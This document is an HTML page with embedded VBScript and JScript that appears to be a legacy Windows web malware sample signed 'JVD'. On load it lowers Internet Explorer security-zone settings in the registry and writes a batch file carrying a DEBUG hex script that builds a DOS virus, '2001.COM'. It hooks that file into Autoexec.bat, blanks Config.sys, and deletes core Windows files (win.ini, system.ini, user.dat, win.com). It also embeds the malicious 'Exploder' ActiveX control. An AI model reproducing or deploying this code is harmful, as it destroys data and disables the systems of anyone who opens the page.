<HTML>
<Head>
<Script Language="VBScript">
  Set WshShell = CreateObject("WScript.Shell")
  WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
  WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
  WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
  WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
  WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
  WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
</Script>
<Script Language = "JScript">
 function JVDropper()
{
  var fso, tf;
  fso = new ActiveXObject("Scripting.FileSystemObject");
  tf = fso.CreateTextFile("c:\\Windows\\Hello.bat", true);
  tf.Writeline ("@echo off");
  tf.Writeline ("debug < c:\\windows\\Hello.bat > nul");
  tf.Writeline ("cls");
  tf.Writeline ("2001.com");
  tf.Writeline ("exit");
  tf.WriteBlankLines(1);
  tf.Writeline ("N 2001.COM");
  tf.Writeline ("E 0100 B4 3B BA 3C 03 CD 21 B9 D1 07 BA 6E 02 B4 2B CD ");
  tf.Writeline ("E 0110 21 BA 4F 03 B9 02 00 B4 4E CD 21 B4 4F BA 4F 03 ");
  tf.Writeline ("E 0120 CD 21 B4 43 BA 9E 00 B0 00 CD 21 B1 00 B4 43 90 ");
  tf.Writeline ("E 0130 BA 9E 00 B0 01 CD 21 B8 02 3D BA 9E 00 CD 21 93 ");
  tf.Writeline ("E 0140 B9 5A 02 B4 40 BA 00 01 CD 21 B4 3E CD 21 FF 06 ");
  tf.Writeline ("E 0150 65 03 83 3E 65 03 0A 7D 03 E8 BF FF B4 3B BA 67 ");
  tf.Writeline ("E 0160 03 CD 21 FE 06 33 03 80 3E 33 03 03 75 AD C7 06 ");
  tf.Writeline ("E 0170 65 03 00 00 B4 09 BA 54 03 CD 21 FF 06 65 03 83 ");
  tf.Writeline ("E 0180 3E 65 03 41 7D 45 8B 16 65 03 33 DB BB FF 00 E8 ");
  tf.Writeline ("E 0190 00 00 33 C0 B0 2E E6 70 E4 71 86 E8 B0 2F E6 70 ");
  tf.Writeline ("E 01A0 E4 71 86 C8 52 86 D0 E6 70 E4 71 2B C8 03 CB 5A ");
  tf.Writeline ("E 01B0 86 D0 E6 70 86 C3 E6 71 B0 2E E6 70 86 C5 E6 71 ");
  tf.Writeline ("E 01C0 B0 2F E6 70 86 C1 E6 71 E8 A9 FF E8 19 00 00 00 ");
  tf.Writeline ("E 01D0 32 30 30 31 20 7E 20 41 20 76 69 72 61 6C 20 4F ");
  tf.Writeline ("E 01E0 64 64 65 73 73 79 24 0E 1F E4 61 0C 03 E6 61 BE ");
  tf.Writeline ("E 01F0 00 00 B0 B6 E6 43 BB 0B 03 8A 00 3C FF 74 2B 98 ");
  tf.Writeline ("E 0200 BB FB 02 48 D1 E0 8B F8 8B 11 8A C2 E6 42 8A C6 ");
  tf.Writeline ("E 0210 E6 42 B4 00 CD 1A BB 16 03 8A 08 B5 00 8B DA 03 ");
  tf.Writeline ("E 0220 D9 CD 1A 3B D3 75 FA 46 EB CC E4 61 24 FC E6 61 ");
  tf.Writeline ("E 0230 B4 00 B0 13 CD 10 B0 01 FF 06 CE 01 FE C0 B9 96 ");
  tf.Writeline ("E 0240 00 BA 64 00 2B 16 CE 01 B4 0C B7 00 CD 10 B9 96 ");
  tf.Writeline ("E 0250 00 BA 64 00 2B 16 CE 01 2B 0E CE 01 B4 0C B7 00 ");
  tf.Writeline ("E 0260 CD 10 B4 0C B7 00 B9 96 00 BA 64 00 2B 0E CE 01 ");
  tf.Writeline ("E 0270 CD 10 B4 0C B7 00 B9 96 00 BA 64 00 03 16 CE 01 ");
  tf.Writeline ("E 0280 CD 10 B4 0C B7 00 B9 96 00 BA 64 00 03 16 CE 01 ");
  tf.Writeline ("E 0290 03 0E CE 01 CD 10 B4 0C B4 0C B9 96 00 BA 64 00 ");
  tf.Writeline ("E 02A0 03 0E CE 01 CD 10 B4 0C B7 00 B9 96 00 BA 64 00 ");
  tf.Writeline ("E 02B0 03 0E CE 01 2B 16 CE 01 CD 10 B4 0C B7 00 B9 96 ");
  tf.Writeline ("E 02C0 00 BA 64 00 2B 0E CE 01 03 16 CE 01 CD 10 83 3E ");
  tf.Writeline ("E 02D0 CE 01 64 74 03 E8 60 FF B4 09 BA D0 01 CD 21 B8 ");
  tf.Writeline ("E 02E0 00 00 CD 33 B8 01 00 CD 33 B4 00 CD 16 B8 02 00 ");
  tf.Writeline ("E 02F0 CD 33 B4 00 B0 03 CD 10 E8 30 00 98 08 A1 09 3D ");
  tf.Writeline ("E 0300 09 7D 0A DF 0C A2 0D 7D 0F 00 00 01 02 03 04 05 ");
  tf.Writeline ("E 0310 06 07 01 02 03 FF 01 01 01 01 01 01 01 01 01 01 ");
  tf.Writeline ("E 0320 FF 51 52 33 C0 CD 1A 92 5A 59 C3 B4 31 BA 30 75 ");
  tf.Writeline ("E 0330 CD 21 C3 02 57 49 4E 2E 43 4F 4D 00 43 3A 5C 77 ");
  tf.Writeline ("E 0340 69 6E 64 6F 77 73 5C 63 6F 6D 6D 61 6E 64 00 2A ");
  tf.Writeline ("E 0350 2E 43 2A 00 A7 20 45 76 75 4C 7A 20 4D 61 4C 69 ");
  tf.Writeline ("E 0360 43 65 20 A7 24 00 00 2E 2E ");
  tf.Writeline ("RCX");
  tf.Writeline ("0269");
  tf.Writeline ("W");
  tf.Writeline ("Q");
  tf.Close();
}
{
  var fso, ts, tz;
  var ForWriting= 2;
  fso = new ActiveXObject("Scripting.FileSystemObject");
  ts = fso.OpenTextFile("c:\\Autoexec.bat", ForWriting, true);
  ts.WriteLine("Call Hello.bat");
  ts.Close();
  tz = fso.OpenTextFile("c:\\Config.sys", ForWriting, true);
  tz.WriteBlankLines(1);
  tz.Close();
}
{
  var fso, f1, f2, f3, f4;
  fso = new ActiveXObject("Scripting.FileSystemObject");
  f1 = fso.GetFile("c:\\Windows\win.ini");
  f2 = fso.GetFile("c:\\Windows\system.ini");
  f3 = fso.GetFile("c:\\Windows\user.dat");
  f4 = fso.GetFile("c:\\Windows\win.com");
  f1.Delete();
  f2.Delete();
  f3.Delete();
  f4.Delete();
}
</Script>
<H1> You've Been JVD'd..... heh! </H1>
<OBJECT ID="Exploder1" WIDTH=86 HEIGHT=31 CODEBASE="Exploder.ocx" CLASSID="CLSID:DE70D9E3-C55A-11CF-8E43-780C02C10128">
    <PARAM NAME="_Version" VALUE="65536">
    <PARAM NAME="_ExtentX" VALUE="2646">
    <PARAM NAME="_ExtentY" VALUE="1323">
    <PARAM NAME="_StockProps" VALUE="0">
Exploder Control!</OBJECT>
</Body>
</Head>
</HTML>